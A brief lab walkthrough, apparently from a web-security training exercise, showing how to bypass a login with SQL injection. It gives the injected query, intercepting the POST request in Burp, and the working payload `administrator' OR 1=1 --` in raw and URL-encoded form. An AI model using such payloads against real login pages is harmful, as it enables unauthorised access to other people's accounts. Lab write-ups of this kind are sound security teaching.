# Lab: SQL injection vulnerability allowing login bypass

**Craft the SQL query in this format** 

    SELECT * FROM users WHERE username = 'administrator' OR 1=1 --' AND password = 'admin'

Intercept the request using burp proxy, since its a POST request, craft the query in burp and forward the request

**SQLi**

    csrf=odfZD0E7VF4kbPRGFsCHQLMCQyXp25BO&username=administrator' OR 1=1 --&password=admin

**SQLi (After URL Encoding)**

    csrf=odfZD0E7VF4kbPRGFsCHQLMCQyXp25BO&username=administrator%27+OR+1%3D1+--&password=admin

